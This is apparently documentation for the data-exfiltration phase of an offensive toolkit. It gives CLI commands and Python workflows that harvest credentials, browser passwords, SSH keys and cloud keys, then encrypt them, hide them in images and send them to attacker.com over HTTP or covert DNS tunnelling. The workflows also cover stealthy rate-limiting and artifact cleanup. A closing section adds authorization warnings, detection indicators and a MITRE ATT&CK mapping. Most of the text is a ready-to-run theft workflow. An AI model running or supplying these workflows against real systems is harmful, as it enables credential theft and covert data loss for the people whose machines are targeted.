# Phase 5: Data Exfiltration

## Overview

Phase 5 implements comprehensive data exfiltration capabilities including discovery, preparation, and multiple exfiltration channels. This phase combines data discovery, encryption, compression, and covert exfiltration techniques to simulate real-world data theft scenarios.

## Architecture

```
Phase 5 Components:
├── Data Discovery
│   ├── File Classification (Documents, Credentials, Databases, Config)
│   ├── Browser Data Extraction (Cookies, History, Passwords)
│   ├── SSH Key Discovery
│   └── Cloud Credentials (AWS, Azure, GCP)
├── Data Preparation
│   ├── AES-256-GCM Encryption
│   ├── Compression (ZIP, tar.gz, gzip)
│   └── Basic Steganography
├── Exfiltration Channels
│   ├── HTTP/HTTPS (Chunked, Resumable)
│   └── DNS Tunneling (Covert, Firewall Bypass)
└── Automated Scanner
    └── End-to-End Exfiltration Workflow
```

## Modules

### 1. Data Discovery (`exfiltration/data_discovery.py`)

Discover and classify sensitive data on target systems.

**Features:**
- File classification by type and sensitivity
- Credential detection (passwords, API keys, private keys)
- Browser data discovery
- SSH key enumeration
- Cloud provider credentials
- Content analysis for embedded secrets

**Usage:**

```bash
# Discover all sensitive data
python exfiltration/data_discovery.py

# Search specific directories
python exfiltration/data_discovery.py --search /home/user/Documents /home/user/Desktop

# Filter by category
python exfiltration/data_discovery.py --category credentials

# Filter by confidence level
python exfiltration/data_discovery.py --confidence critical

# Export to JSON
python exfiltration/data_discovery.py --export discovery.json --verbose
```

**Python API:**

```python
from exfiltration.data_discovery import DataDiscovery

# Initialize
discovery = DataDiscovery(verbose=True)

# Discover all sensitive data
files = discovery.discover_all()

# Or search specific paths
files = discovery.search_directory('/home/user/Documents', max_depth=3)

# Discover browser data
browser_files = discovery.discover_browser_data()

# Discover SSH keys
ssh_keys = discovery.discover_ssh_keys()

# Discover cloud credentials
cloud_creds = discovery.discover_cloud_credentials()

# Filter results
critical_files = discovery.filter_by_confidence('critical')
credential_files = discovery.filter_by_category('credentials')

# Generate report
print(discovery.generate_report())

# Export
discovery.export_json('sensitive_data.json')
```

### 2. HTTP Exfiltration (`exfiltration/exfil_http.py`)

Exfiltrate data over HTTP/HTTPS with chunking and progress tracking.

**Features:**
- File chunking for large files
- Base64 encoding
- Progress tracking
- Resume capability
- Rate limiting
- Custom headers for stealth
- Built-in exfiltration server

**Usage:**

```bash
# Start exfiltration server
python exfiltration/exfil_http.py server --port 8000

# Exfiltrate single file
python exfiltration/exfil_http.py client --url http://attacker.com:8000 \
  --file /path/to/sensitive.pdf

# Exfiltrate directory
python exfiltration/exfil_http.py client --url http://attacker.com:8000 \
  --dir /home/user/Documents \
  --rate-limit 0.5

# Exfiltrate text data
python exfiltration/exfil_http.py client --url http://attacker.com:8000 \
  --text "sensitive data"

# Disable SSL verification
python exfiltration/exfil_http.py client --url https://attacker.com:8443 \
  --file sensitive.pdf \
  --no-verify-ssl
```

**Python API:**

```python
from exfiltration.exfil_http import HTTPExfiltration

# Initialize
exfil = HTTPExfiltration(
    target_url='http://attacker.com:8000',
    chunk_size=1024*1024,  # 1MB chunks
    verify_ssl=True
)

# Exfiltrate file
success = exfil.exfiltrate_file(
    file_path='/path/to/file.pdf',
    metadata={'category': 'credentials', 'confidence': 'critical'},
    rate_limit=0.5  # 500ms between chunks
)

# Exfiltrate directory
stats = exfil.exfiltrate_directory(
    directory='/home/user/Documents',
    rate_limit=1.0,
    recursive=True
)

# Exfiltrate text
exfil.exfiltrate_text(
    data='sensitive information',
    filename='data.txt'
)

# Send beacon
exfil.send_beacon(status='active')

# Get statistics
stats = exfil.get_stats()
print(f"Files sent: {stats['files_sent']}")
print(f"Data sent: {stats['mb_sent']:.2f} MB")

# Generate report
print(exfil.generate_report())
```

### 3. DNS Tunneling (`exfiltration/exfil_dns.py`)

Covert data exfiltration via DNS queries to bypass firewalls.

**Features:**
- Base32 encoding for DNS-safe queries
- Automatic chunking for long data
- Session tracking
- Configurable delay between queries
- Works through most firewalls

**Usage:**

```bash
# Exfiltrate file via DNS
python exfiltration/exfil_dns.py client \
  --domain attacker.com \
  --file /path/to/secrets.txt \
  --session-id session123 \
  --delay 1.0

# Exfiltrate text
python exfiltration/exfil_dns.py client \
  --domain attacker.com \
  --text "secret data" \
  --delay 0.5

# Use custom DNS server
python exfiltration/exfil_dns.py client \
  --domain attacker.com \
  --dns-server 8.8.8.8 \
  --file data.txt

# Show server setup
python exfiltration/exfil_dns.py server --domain attacker.com
```

**Python API:**

```python
from exfiltration.exfil_dns import DNSTunneling

# Initialize
dns_tunnel = DNSTunneling(
    domain='attacker.com',
    dns_server=None,  # Use system DNS
    delay=0.5
)

# Exfiltrate file
success = dns_tunnel.exfiltrate_file(
    file_path='/path/to/file.txt',
    session_id='session123'
)

# Exfiltrate text
success = dns_tunnel.exfiltrate_text(
    text='sensitive data',
    session_id='session123'
)

# Exfiltrate raw data
data = b'secret bytes'
success = dns_tunnel.exfiltrate_data(data, session_id='session123')

# Get statistics
stats = dns_tunnel.get_stats()
print(f"Queries sent: {stats['queries_sent']}")
print(f"Bytes sent: {stats['bytes_sent']}")

# Generate report
print(dns_tunnel.generate_report())
```

### 4. Data Preparation (`exfiltration/data_prep.py`)

Prepare data for exfiltration with encryption and compression.

**Features:**
- AES-256-GCM encryption
- Password-based key derivation
- ZIP/tar.gz/gzip compression
- Basic LSB steganography
- Encrypt-then-compress workflow

**Usage:**

```bash
# Encrypt file
python exfiltration/data_prep.py encrypt \
  --input sensitive.pdf \
  --output sensitive.pdf.enc

# Encrypt with password
python exfiltration/data_prep.py encrypt \
  --input sensitive.pdf \
  --password MySecretPassword123

# Decrypt file
python exfiltration/data_prep.py decrypt \
  --input sensitive.pdf.enc \
  --key <base64_key> \
  --output sensitive.pdf

# Compress files to ZIP
python exfiltration/data_prep.py compress \
  --files file1.txt file2.pdf file3.docx \
  --output archive.zip \
  --format zip

# Hide data in image (steganography)
python exfiltration/data_prep.py hide \
  --data secrets.txt \
  --image cover.png \
  --output stego.png

# Extract data from image
python exfiltration/data_prep.py extract \
  --image stego.png \
  --output extracted.txt
```

**Python API:**

```python
from exfiltration.data_prep import DataPreparation

# Initialize with random key
prep = DataPreparation()

# Or with password
key, salt = DataPreparation.derive_key_from_password('MyPassword123')
prep = DataPreparation(encryption_key=key)

# Encrypt file
encrypted_file = prep.encrypt_file('sensitive.pdf', 'sensitive.pdf.enc')
print(f"Encryption key: {prep.get_key_base64()}")

# Decrypt file
decrypted_file = prep.decrypt_file('sensitive.pdf.enc', 'decrypted.pdf')

# Encrypt raw data
plaintext = b'secret data'
encrypted = prep.encrypt_data(plaintext)
decrypted = prep.decrypt_data(encrypted)

# Compress files
files = ['file1.txt', 'file2.pdf', 'file3.docx']
archive = DataPreparation.compress_zip(files, 'archive.zip', compression_level=9)

# Compress with tar.gz
archive = DataPreparation.compress_targz(files, 'archive.tar.gz')

# Compress single file with gzip
compressed = DataPreparation.compress_gzip('largefile.txt')

# Compress and encrypt directory
prep.compress_and_encrypt_directory(
    directory='/home/user/Documents',
    output_file='documents.enc',
    format='zip'
)

# Steganography (requires Pillow)
with open('secrets.txt', 'rb') as f:
    secret_data = f.read()

DataPreparation.hide_in_image(
    data=secret_data,
    image_path='cover.png',
    output_path='stego.png'
)

# Extract from image
extracted = DataPreparation.extract_from_image('stego.png')
```

### 5. Automated Exfiltration (`exfiltration/automated_exfil.py`)

End-to-end automated data exfiltration workflow.

**Features:**
- Automated data discovery
- Target prioritization
- Automatic encryption and compression
- Multi-channel exfiltration
- Progress tracking
- Comprehensive reporting

**Usage:**

```bash
# Full automated scan (HTTP)
python exfiltration/automated_exfil.py \
  --method http \
  --url http://attacker.com:8000 \
  --export results.json

# DNS tunneling
python exfiltration/automated_exfil.py \
  --method dns \
  --domain attacker.com \
  --rate-limit 1.0

# Exfiltrate specific category
python exfiltration/automated_exfil.py \
  --method http \
  --url http://attacker.com:8000 \
  --category credentials \
  --max-files 10

# Custom search paths
python exfiltration/automated_exfil.py \
  --method http \
  --url http://attacker.com:8000 \
  --search /home/user/Documents /home/user/Desktop \
  --max-size 5242880  # 5MB

# Disable encryption/compression
python exfiltration/automated_exfil.py \
  --method http \
  --url http://attacker.com:8000 \
  --no-encrypt \
  --no-compress
```

**Python API:**

```python
from exfiltration.automated_exfil import AutomatedExfiltration

# Initialize
scanner = AutomatedExfiltration(
    exfil_method='http',
    exfil_url='http://attacker.com:8000',
    encrypt=True,
    compress=True,
    verbose=True
)

# Run full automated scan
results = scanner.run_full_scan(
    search_paths=['/home/user/Documents', '/home/user/Desktop'],
    max_file_size=10*1024*1024,  # 10MB
    rate_limit=0.5
)

# Or exfiltrate specific category
scanner.discovery.discover_all()
scanner.exfiltrate_specific_category(
    category='credentials',
    max_files=20,
    rate_limit=1.0
)

# Generate report
print(scanner.generate_report())

# Export results
scanner.export_results('exfil_results.json')

# Access statistics
print(f"Files exfiltrated: {scanner.files_exfiltrated}")
print(f"Data exfiltrated: {scanner.bytes_exfiltrated / (1024*1024):.2f} MB")
print(f"Encryption key: {scanner.scan_results.get('encryption_key')}")
```

## Complete Workflows

### Workflow 1: Manual Targeted Exfiltration

```python
from exfiltration.data_discovery import DataDiscovery
from exfiltration.data_prep import DataPreparation
from exfiltration.exfil_http import HTTPExfiltration

# Step 1: Discover critical data
discovery = DataDiscovery(verbose=True)
discovery.discover_all()

critical_files = discovery.filter_by_confidence('critical')
print(f"[+] Found {len(critical_files)} critical files")

# Step 2: Prepare data
prep = DataPreparation()

# Collect files
files_to_exfil = [f.file_path for f in critical_files[:10]]

# Compress
archive = DataPreparation.compress_zip(files_to_exfil, 'critical_data.zip')

# Encrypt
encrypted_archive = prep.encrypt_file(archive, 'critical_data.zip.enc')

print(f"[*] Encryption key (save this): {prep.get_key_base64()}")

# Step 3: Exfiltrate
exfil = HTTPExfiltration('http://attacker.com:8000')

success = exfil.exfiltrate_file(
    encrypted_archive,
    metadata={'type': 'critical_data', 'file_count': len(files_to_exfil)},
    rate_limit=0.5
)

# Cleanup
import os
os.remove(archive)
os.remove(encrypted_archive)

print(exfil.generate_report())
```

### Workflow 2: Covert DNS Exfiltration

```python
from exfiltration.data_discovery import DataDiscovery
from exfiltration.exfil_dns import DNSTunneling

# Step 1: Discover small credential files
discovery = DataDiscovery()
discovery.discover_all()

# Filter for small credential files (<100KB)
small_creds = [
    f for f in discovery.filter_by_category('credentials')
    if f.size < 100 * 1024
]

print(f"[+] Found {len(small_creds)} small credential files")

# Step 2: Exfiltrate via DNS (covert, bypasses firewall)
dns_tunnel = DNSTunneling(domain='attacker.com', delay=2.0)

for i, cred_file in enumerate(small_creds, 1):
    print(f"[{i}/{len(small_creds)}] Exfiltrating: {cred_file.file_path}")

    dns_tunnel.exfiltrate_file(
        cred_file.file_path,
        session_id=f"cred{i}"
    )

    # Slow and stealthy
    import time
    time.sleep(5)

print(dns_tunnel.generate_report())
```

### Workflow 3: Automated Full Exfiltration

```python
from exfiltration.automated_exfil import AutomatedExfiltration

# Full automated workflow with all features
scanner = AutomatedExfiltration(
    exfil_method='http',
    exfil_url='http://attacker.com:8000',
    encrypt=True,
    compress=True,
    verbose=True
)

# Run automated scan
results = scanner.run_full_scan(
    search_paths=None,  # Use defaults
    max_file_size=10*1024*1024,
    rate_limit=0.5
)

# Save report
report = scanner.generate_report()

with open('exfil_report.txt', 'w') as f:
    f.write(report)

# Export results with encryption key
scanner.export_results('exfil_results.json')

print(report)
```

### Workflow 4: Steganography Exfiltration

```python
from exfiltration.data_discovery import DataDiscovery
from exfiltration.data_prep import DataPreparation

# Discover small sensitive files
discovery = DataDiscovery()
discovery.discover_all()

small_files = [f for f in discovery.discovered_files if f.size < 50*1024]  # <50KB

# Hide each in a different image
for i, sensitive_file in enumerate(small_files[:5], 1):
    with open(sensitive_file.file_path, 'rb') as f:
        data = f.read()

    # Hide in image
    output_image = f'vacation_photo_{i}.png'

    DataPreparation.hide_in_image(
        data=data,
        image_path='cover_image.png',
        output_path=output_image
    )

    print(f"[+] Hidden {sensitive_file.file_path} in {output_image}")

print("[*] Upload these 'vacation photos' to social media or cloud storage")
```

### Workflow 5: Multi-Channel Exfiltration

```python
from exfiltration.data_discovery import DataDiscovery
from exfiltration.exfil_http import HTTPExfiltration
from exfiltration.exfil_dns import DNSTunneling

# Discover data
discovery = DataDiscovery()
discovery.discover_all()

# Separate by size
large_files = [f for f in discovery.discovered_files if f.size > 1024*1024]  # >1MB
small_files = [f for f in discovery.discovered_files if f.size <= 1024*1024]

# Large files via HTTP (faster)
http_exfil = HTTPExfiltration('http://attacker.com:8000')

for large_file in large_files[:5]:
    http_exfil.exfiltrate_file(large_file.file_path, rate_limit=0.2)

# Small files via DNS (covert)
dns_tunnel = DNSTunneling('attacker.com', delay=1.0)

for small_file in small_files[:10]:
    dns_tunnel.exfiltrate_file(small_file.file_path)

print("HTTP Stats:")
print(http_exfil.generate_report())

print("\nDNS Stats:")
print(dns_tunnel.generate_report())
```

## Security Considerations

**CRITICAL WARNINGS:**

1. **Authorization Required**: Only use on systems you own or have explicit written permission to test
2. **Data Exfiltration**: Extremely serious offense with severe legal consequences
3. **Network Monitoring**: Exfiltration will be detected by security tools (IDS/IPS, DLP)
4. **Legal Implications**: Unauthorized data exfiltration is a crime in all jurisdictions
5. **Privacy Laws**: May violate GDPR, HIPAA, PCI-DSS and other regulations

**Detection Indicators:**
- Large outbound data transfers
- DNS queries to unusual domains
- HTTP POST requests with large payloads
- Encrypted traffic to suspicious IPs
- Access to sensitive file locations

**Best Practices:**
- Always obtain written authorization
- Use in isolated lab environments
- Document all actions during legitimate testing
- Clean up all artifacts after testing
- Report findings responsibly
- Respect data privacy and regulations

## Troubleshooting

### HTTP Exfiltration Issues

**Connection Timeout:**
- Verify target URL is accessible
- Check firewall rules
- Try with `--no-verify-ssl` for HTTPS

**Server Errors:**
- Ensure exfiltration server is running
- Check server logs for errors
- Verify chunk size isn't too large

### DNS Tunneling Issues

**Queries Not Received:**
- DNS queries may be cached
- Use custom DNS server with `--dns-server`
- Increase delay between queries
- Check DNS server logs

**Data Corruption:**
- Base32 encoding should prevent this
- Verify all chunks received
- Check session ID matches

### Data Discovery Issues

**No Files Found:**
- Check search paths are correct
- Verify permissions to read directories
- Some files may be protected

**False Positives:**
- Adjust confidence thresholds
- Review classification patterns
- Manual review recommended

## Testing

Run Phase 5 tests:

```bash
# Run exfiltration tests
pytest tests/test_exfiltration.py -v

# Run with coverage
pytest tests/test_exfiltration.py -v --cov=exfiltration
```

**Expected Results:**
- 41 tests total
- 100% pass rate
- 40%+ code coverage (for exfiltration modules)

## MITRE ATT&CK Mapping

Phase 5 implements the following MITRE ATT&CK techniques:

- **T1020** - Automated Exfiltration
- **T1030** - Data Transfer Size Limits
- **T1048** - Exfiltration Over Alternative Protocol
- **T1048.003** - Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- **T1041** - Exfiltration Over C2 Channel
- **T1071** - Application Layer Protocol
- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1071.004** - Application Layer Protocol: DNS
- **T1560** - Archive Collected Data
- **T1560.001** - Archive via Utility
- **T1560.002** - Archive via Library
- **T1027** - Obfuscated Files or Information
- **T1132** - Data Encoding

## Next Steps

After Phase 5:
1. Review all exfiltrated data
2. Verify encryption keys are saved
3. Test data recovery from exfiltrated archives
4. Proceed to Phase 6: Reporting & Cleanup
5. Document findings and create final report

## Additional Resources

- [OWASP Data Exfiltration Prevention](https://owasp.org/www-community/attacks/Data_Exfiltration)
- [DNS Tunneling Detection](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused/)
- [Steganography Tools](https://github.com/DominicBreuker/stego-toolkit)
- [Data Loss Prevention (DLP)](https://www.cloudflare.com/learning/access-management/what-is-dlp/)
- [MITRE ATT&CK - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
